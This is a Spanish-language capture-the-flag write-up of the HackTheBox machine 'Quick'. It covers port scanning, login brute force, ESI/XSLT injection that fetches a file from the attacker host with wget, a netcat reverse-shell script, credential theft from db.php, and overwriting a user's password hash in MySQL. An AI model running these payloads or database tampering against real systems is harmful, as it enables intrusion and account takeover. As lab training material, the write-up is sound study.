Scanning 10.10.10.186 [65535 ports]
Discovered open port 22/tcp on 10.10.10.186
Discovered open port 9001/tcp on 10.10.10.186
Completed SYN Stealth Scan at 21:47, 17.10s elapsed (65535 total ports)
Nmap scan report for 10.10.10.186
Host is up, received user-set (0.14s latency).
Scanned at 2023-06-16 21:46:51 GMT for 17s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
9001/tcp open  tor-orport syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.28 seconds
           Raw packets sent: 83322 (3.666MB) | Rcvd: 83310 (3.332MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,9001 10.10.10.186 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 21:48 GMT
Nmap scan report for 10.10.10.186
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Quick | Broadband Services
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.12 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.6p1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9001&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Utilizaremos &lt;code&gt;whatweb&lt;/code&gt; para identificar las tecnoligias que emplea el servicio web de la maquina en el puerto &lt;code&gt;9001&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.186:9001
http://10.10.10.186:9001 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.186], Script, Title[Quick | Broadband Services], Via-Proxy[1.1 localhost (Apache-HttpClient/4.5.2 (cache))], X-Powered-By[Esigate]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que el servicio corresponde a un &lt;code&gt;Esigate&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Esigate: ESIGate permite una integración transparente y eficiente entre todas las aplicaciones Web. Por ejemplo, agregue a un CMS (Sistema de gestión de contenidos) módulos desarrollados en cualquier lenguaje (PHP, Java, . Net…) sin problemas de caché o de accesibilidad.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Abrimos el servicio en el navegador y vemos un mensaje &lt;code&gt;update&lt;/code&gt;, donde nos comenta que se esta utilizando la ultima versión de &lt;code&gt;http&lt;/code&gt;, que corresponde a &lt;code&gt;http3&lt;/code&gt;, ademas tambien podemos ver una lista de usuarios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si vamos al enlace de &lt;code&gt;clientes&lt;/code&gt;, obtenemos mas información de los usuarios como la empresa y pais a la cual pertenecen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Volviendo a la pagina principal, haciendo hovering en &lt;code&gt;portal&lt;/code&gt; obtenemos que se nos redirige a otro subdominio, el cual añadiremos a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.186 quick.htb portal.quick.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que no podemos visualizar la pagina, aun agregando los subdominios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Investigando un poco del &lt;code&gt;http3&lt;/code&gt;, vemos que la nueva versión de &lt;code&gt;http3&lt;/code&gt; sera la que deje de usar el protocolo &lt;code&gt;TCP&lt;/code&gt; y lo reemplazara por uno nuevo de nombre &lt;code&gt;Quick&lt;/code&gt;. Curiosamente similar al nombre de la maquina.&lt;/p&gt;

&lt;p&gt;Puedes ver mas detalles en el siguiente articulo.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.xataka.com/basics/http-3-que-donde-viene-que-que-cambia-para-buscar-internet-rapido&quot;&gt;https://www.xataka.com/basics/http-3-que-donde-viene-que-que-cambia-para-buscar-internet-rapido&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para poder usar esta versión experimental, vamos a recompilar una versión de &lt;code&gt;curl&lt;/code&gt;, del siguiente repositorio:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version&quot;&gt;https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para efectos practicos ejecutando los siguientes comandos podremos obtener el binario funcional.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez lo tengamos correctamente instalado, ejecutamos y esta vez si podemos ver la pagina, la cual nos expone algunas rutas.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
❯ ./src/.libs/curl -s --http3 &quot;https://portal.quick.htb/&quot; -k
&amp;lt;html&amp;gt;
  &amp;lt;ul&amp;gt;
    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php&quot;&amp;gt;Home&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php?view=contact&quot;&amp;gt;Contact&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php?view=about&quot;&amp;gt;About&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php?view=docs&quot;&amp;gt;References&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;/ul&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Encontramos nuevos usuarios en la ruta &lt;code&gt;about&lt;/code&gt; y usamos &lt;code&gt;html2text&lt;/code&gt; para moestrarlo estetico en consola.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ./src/.libs/curl -s --http3 &quot;https://portal.quick.htb/?view=about&quot; -k | html2text
****** Quick | About Us ******
***** Our Team *****
[Jane]
***** Jane Doe *****
CEO &amp;amp; Founder
Quick Broadband services established in 2012 by Jane.
jane@quick.htb
[Mike]
***** Mike Ross *****
Sales Manager
Manages the sales and services.
mike@quick.htb
[John]
***** John Doe *****
Web Designer
Front end developer.
john@quick.htb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Encontramos un &lt;code&gt;pdf&lt;/code&gt;, donde podemos obtener una contraseña &lt;code&gt;Quick4cc3$$&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./src/.libs/curl --http3 &quot;https://portal.quick.htb/docs/QuickStart.pdf&quot; -k --output QuickStart.pdf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos dirigimos al panel principal y vamos al enlace &lt;code&gt;Get Started&lt;/code&gt;, que nos redirige a un panel de logeo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Contamos con una contraseña, pero recordemos que anteriormente obtuvimos una lista de usuarios. Como el panel de logeo nos pide un email valido, vamos a crearnos un diccionario con los usuarios que obtuvimos, y ya que tambien se nos filtro la compañia y pais de origen de cada uno, podemos computar posibles correos a partir de estos datos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat users.txt
tim@qconsulting.co.uk
tim@qconsulting.co
tim@qconsulting.uk
tim@qconsulting.com
tim@quick.htb
roy@darkwng.us
roy@quick.htb
roy@darkwng.com
elisa@wink.uk
elisa@wink.co.uk
elisa@quick.htb
elisa@wink.com
james@lazycoop.cn
james@lazycoop.com
james@quick.htb
mike@quick.htb
jane@quick.htb
jhon@quick.htb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora mediante fuerza bruta trataremos de encontrar una credencial valida, para ello usaremos &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 50 -w $(pwd)/users.txt -d 'email=FUZZ&amp;amp;password=Quick4cc3$$' &quot;http://10.10.10.186:9001/login.php&quot;
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.186:9001/login.php
Total requests: 18

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000003:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.uk&quot;                                                                                                  
000000007:   200        0 L      2 W        80 Ch       &quot;roy@quick.htb&quot;                                                                                                       
000000015:   200        0 L      2 W        80 Ch       &quot;james@quick.htb&quot;                                                                                                     
000000014:   200        0 L      2 W        80 Ch       &quot;james@lazycoop.com&quot;                                                                                                  
000000001:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.co.uk&quot;                                                                                               
000000012:   200        0 L      2 W        80 Ch       &quot;elisa@wink.com&quot;                                                                                                      
000000016:   200        0 L      2 W        80 Ch       &quot;mike@quick.htb&quot;                                                                                                      
000000013:   200        0 L      2 W        80 Ch       &quot;james@lazycoop.cn&quot;                                                                                                   
000000018:   200        0 L      2 W        80 Ch       &quot;jhon@quick.htb&quot;                                                                                                      
000000017:   200        0 L      2 W        80 Ch       &quot;jane@quick.htb&quot;                                                                                                      
000000006:   200        0 L      2 W        80 Ch       &quot;roy@darkwng.us&quot;                                                                                                      
000000010:   302        0 L      0 W        0 Ch        &quot;elisa@wink.co.uk&quot;                                                                                                    
000000011:   200        0 L      2 W        80 Ch       &quot;elisa@quick.htb&quot;                                                                                                     
000000009:   200        0 L      2 W        80 Ch       &quot;elisa@wink.uk&quot;                                                                                                       
000000002:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.co&quot;                                                                                                  
000000005:   200        0 L      2 W        80 Ch       &quot;tim@quick.htb&quot;                                                                                                       
000000008:   200        0 L      2 W        80 Ch       &quot;roy@darkwng.com&quot;                                                                                                     
000000004:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.com&quot;                                                                                                 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que uno nos reporta un codigo de estado &lt;code&gt;302&lt;/code&gt;, validamos las credenciales y ganamos acceso a un panel de generación de &lt;code&gt;tickets&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anteriormente vimos que el servicio web, usaba &lt;code&gt;esigate&lt;/code&gt; y buscando vulnerabilidades asociadas encontramos que podemos hace una inyección para obtener &lt;code&gt;RCE a traves de XSLT&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Dejo el siguiente articulo si quieres saber a detalle en que consiste la vulnerabilidad y su explotación paso a paso.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/&quot;&gt;https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para explotar vamos a crear dos archivo con extension &lt;code&gt;xml y xsl&lt;/code&gt;, con el mismo contenido, donde en la opción &lt;code&gt;CDATA&lt;/code&gt; inyectaremos el codigo que queremos ejecutar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;
&amp;lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&amp;gt;
&amp;lt;xsl:output method=&quot;xml&quot; omit-xml-declaration=&quot;yes&quot;/&amp;gt;
&amp;lt;xsl:template match=&quot;/&quot;
xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;&amp;gt;
&amp;lt;root&amp;gt;
&amp;lt;xsl:variable name=&quot;cmd&quot;&amp;gt;&amp;lt;![CDATA[wget http://10.10.16.4/shell]]&amp;gt;&amp;lt;/xsl:variable&amp;gt;
&amp;lt;xsl:variable name=&quot;rtObj&quot; select=&quot;rt:getRuntime()&quot;/&amp;gt;
&amp;lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtObj, $cmd)&quot;/&amp;gt;
Process: &amp;lt;xsl:value-of select=&quot;$process&quot;/&amp;gt;
Command: &amp;lt;xsl:value-of select=&quot;$cmd&quot;/&amp;gt;
&amp;lt;/root&amp;gt;
&amp;lt;/xsl:template&amp;gt;
&amp;lt;/xsl:stylesheet&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Asi mismo como vamos a hacer una petición a un archivo de nuestra maquina de nombre &lt;code&gt;shell&lt;/code&gt;, vamos a introducir dentro de este un codigo en bash que nos permita obtener una rever shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat shell
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente sera ejecutar el siguiente codigo en la opción de &lt;code&gt;raise ticket&lt;/code&gt;, donde realizaremos una petición a los archivos previamente creados.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;esi:include src=&quot;http://10.10.16.4/a.xml&quot; stylesheet=&quot;http://10.10.16.4/a.xsl&quot;&amp;gt;
&amp;lt;/esi:include&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Se nos generara un codigo de ticket.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Buscamos el ticket en la ruta &lt;code&gt;search.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y en consecuencia recibimos la petición, que indica que se subio nuestro archivo &lt;code&gt;shell&lt;/code&gt; a la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.186 - - [16/Jun/2023 23:40:17] &quot;GET /a.xsl HTTP/1.1&quot; 200 -
10.10.10.186 - - [16/Jun/2023 23:40:17] &quot;GET /a.xml HTTP/1.1&quot; 200 -
10.10.10.186 - - [16/Jun/2023 23:40:18] &quot;GET /shell HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora debemos hacer el mismo proceso, pero esta vez modificaremos nuestros archivos con el comando inyectado en &lt;code&gt;CDATA&lt;/code&gt; por &lt;code&gt;bash shell&lt;/code&gt;, para que se ejecute nuestro archivo.&lt;/p&gt;

&lt;p&gt;Para evitar problemas en esta segunda petición modifiquemos el nombre de los archivos &lt;code&gt;xml y xsl&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;
&amp;lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&amp;gt;
&amp;lt;xsl:output method=&quot;xml&quot; omit-xml-declaration=&quot;yes&quot;/&amp;gt;
&amp;lt;xsl:template match=&quot;/&quot;
xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;&amp;gt;
&amp;lt;root&amp;gt;
  &amp;lt;xsl:variable name=&quot;cmd&quot;&amp;gt;&amp;lt;![CDATA[bash shell]]&amp;gt;&amp;lt;/xsl:variable&amp;gt;
&amp;lt;xsl:variable name=&quot;rtObj&quot; select=&quot;rt:getRuntime()&quot;/&amp;gt;
&amp;lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtObj, $cmd)&quot;/&amp;gt;
Process: &amp;lt;xsl:value-of select=&quot;$process&quot;/&amp;gt;
Command: &amp;lt;xsl:value-of select=&quot;$cmd&quot;/&amp;gt;
&amp;lt;/root&amp;gt;
&amp;lt;/xsl:template&amp;gt;
&amp;lt;/xsl:stylesheet&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Realizamos la misma ejecución.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos genera otro nuevo ticket que al buscarlo nuevamente en la ruta &lt;code&gt;search.php&lt;/code&gt;, ejecuta el archivo dandonos acceso al sistema como el usuario &lt;code&gt;sam&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.186 - - [17/Jun/2023 00:04:41] &quot;GET /c.xsl HTTP/1.1&quot; 200 -
10.10.10.186 - - [17/Jun/2023 00:04:42] &quot;GET /c.xml HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:38672.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
sam
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como es de costumbre, ahora ganaremos acceso con una &lt;code&gt;tty full interactive&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ script /dev/null -c bash
Script started, file is /dev/null
sam@quick:~$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
sam@quick:~$ export TERM=xterm
sam@quick:~$ export SHELL=bash
sam@quick:~$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos dirigimos al directorio personal del usuario &lt;code&gt;sam&lt;/code&gt; y visualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:~$ ls
esigate-distribution-5.2  shell  user.txt
sam@quick:~$ cat user.txt 
359179c57000cd4aa582740c4a637cc6
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que el servicio corre en un &lt;code&gt;apache&lt;/code&gt;, visualizamos el archivo de configuración y encontramos un nuevo subdominio &lt;code&gt;printerv2.quick.htb&lt;/code&gt;, correspondiente a otro panel de logeo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:~$ 2cat /etc/apache2/sites-enabled/000-default.conf 
&amp;lt;VirtualHost *:80&amp;gt;
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with &quot;a2disconf&quot;.
	#Include conf-available/serve-cgi-bin.conf
&amp;lt;/VirtualHost&amp;gt;
&amp;lt;VirtualHost *:80&amp;gt;
	AssignUserId srvadm srvadm
	ServerName printerv2.quick.htb
	DocumentRoot /var/www/printer
&amp;lt;/VirtualHost&amp;gt;
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procemos a añadir el nuevo subdominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.186 printerv2.quick.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Enumerando el sistema, encontramos un archivo con las credenciales de la base de datos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:/var/www/html$ ls
clients.php  db.php  home.php  index.php  login.php  search.php  ticket.php
sam@quick:/var/www/html$ cat db.php 
&amp;lt;?php
$conn = new mysqli(&quot;localhost&quot;,&quot;db_adm&quot;,&quot;db_p4ss&quot;,&quot;quick&quot;);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procemos a enumerar la base de datos y vemos las contraseñas hasheadas de los usuarios.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;sam@quick:/var/www/html$ mysql -udb_adm -pdb_p4ss -D quick
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 128
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&amp;gt; show tables;
+-----------------+
| Tables_in_quick |
+-----------------+
| jobs            |
| tickets         |
| users           |
+-----------------+
3 rows in set (0.00 sec)

mysql&amp;gt; describe users;
+----------+---------------+------+-----+---------+-------+
| Field    | Type          | Null | Key | Default | Extra |
+----------+---------------+------+-----+---------+-------+
| name     | varchar(100)  | YES  |     | NULL    |       |
| email    | varchar(100)  | YES  |     | NULL    |       |
| password | varchar(1000) | YES  |     | NULL    |       |
+----------+---------------+------+-----+---------+-------+
3 rows in set (0.00 sec)

mysql&amp;gt; select email, password from users;
+------------------+----------------------------------+
| email            | password                         |
+------------------+----------------------------------+
| elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+------------------+----------------------------------+
2 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probamos a tratar de crackear los hashes pero no nos resulta posible, pero debemos recordar que al ser el usuario &lt;code&gt;db_adm&lt;/code&gt;, podemos tener algunos privilegios entre ellos el de modificar las credenciales.&lt;/p&gt;

&lt;p&gt;Para ello como ya contamos con la password de &lt;code&gt;elisa&lt;/code&gt;, vamos a modificar a tratar de modificar la password del usuario &lt;code&gt;srvadm&lt;/code&gt;, de tal modo que sea la misma.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;mysql&amp;gt; update users set password=&quot;c6c35ae1f3cb19438e0199cfa72a9d9d&quot; where email=&quot;srvadm@quick.htb&quot;;
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos conectamos exitosamente con las nuevas credenciales &lt;code&gt;srvadm@quick.htb:Quick4cc3$$&lt;/code&gt; y ganamos acceso a una aplicación de impresoras.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si seleccionamos la opción &lt;code&gt;add printer&lt;/code&gt;, vemos que se establece una conexión al puerto &lt;code&gt;9100&lt;/code&gt; y si ingresamos nuestra ip, recibimos una conexión al imprimir.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 9100
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9100
Ncat: Listening on 0.0.0.0:9100
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:44216.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al continuar enumerando el sistema, encontramos un archivo de nombre &lt;code&gt;job.php&lt;/code&gt;, el cual crea un archivo con nombre de la fecha actual y lo almance en la ruta &lt;code&gt;/var/www/jobs&lt;/code&gt; con el contenido que ingresamos en &lt;code&gt;bill details&lt;/code&gt; en jobs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambien podemos observar que despues genera una conexión a una ip y puerto especifico, donde envia dicho contenido. Pero vemos algo muy interesante ya que en el proceso se ejecuta un &lt;code&gt;sleep(0.5)&lt;/code&gt; de medio segundo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
require __DIR__ . '/escpos-php/vendor/autoload.php';
use Mike42\Escpos\PrintConnectors\NetworkPrintConnector;
use Mike42\Escpos\Printer;
include(&quot;db.php&quot;);
session_start();

if($_SESSION[&quot;loggedin&quot;])
{
